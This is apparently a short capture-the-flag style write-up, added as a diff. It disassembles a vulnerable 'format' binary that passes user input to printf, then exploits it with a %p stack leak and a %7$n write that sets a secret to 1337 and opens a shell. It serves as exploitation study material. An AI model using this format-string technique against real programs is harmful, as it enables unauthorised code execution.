@@ -1,0 +1,35 @@
+[0x080484e2]> pdf @ main
+/ (fcn) sym.main 57
+|          ; arg int arg_3        @ ebp+0xc
+|          ; DATA XREF from 0x080483c7 (entry0)
+|          ;-- main:
+|          ;-- sym.main:
+|          0x080484e2    55             push ebp
+|          0x080484e3    89e5           mov ebp, esp
+|          0x080484e5    83e4f0         and esp, 0xfffffff0
+|          0x080484e8    83ec20         sub esp, 0x20
+|          0x080484eb    c744241c30a0.  mov dword [esp + 0x1c], sym.secret  ; [0x804a030:4]=0x62552820  ; " (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4" @ 0x804a030
+|          0x080484f3    8b450c         mov eax, dword [ebp + 0xc]      ; [0xc:4]=0
+|          0x080484f6    83c004         add eax, 4
+|          0x080484f9    8b00           mov eax, dword [eax]
+|          0x080484fb    890424         mov dword [esp], eax
+|          0x080484fe    e84dfeffff     call sym.imp.printf             ; fcn.0804834c+0x4 ;fcn.0804834c() ; sym.imp.printf
+|          0x08048503    a130a00408     mov eax, dword [sym.secret]     ; [0x804a030:4]=0x62552820  ; " (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4" @ 0x804a030
+|          0x08048508    3d39050000     cmp eax, 0x539
+|      ,=< 0x0804850d    7505           jne 0x8048514                 
+|      |   0x0804850f    e899ffffff     call sym.give_shell ;sym.give_shell()
+|      |   ; JMP XREF from 0x0804850d (sym.main)
+|      `-> 0x08048514    b800000000     mov eax, 0
+|          0x08048519    c9             leave
+\          0x0804851a    c3             ret
+
+secret is 0x804a030
+
+stack dump:
+
+❯ ./format "$(python2 -c 'print "%p "*10')"
+0xf2403aa4	0xf2403ab0	0xe4c47cab	0xe4dcf3dc	0xe4e308f8	0x804852b	0x804a030	0x2	0xe4dcf000	(nil)
+1			2			3			4			5			6			7
+
+./format "$(python2 -c 'print "A"*1337 + "%7$n"')"
+sh-4.3$
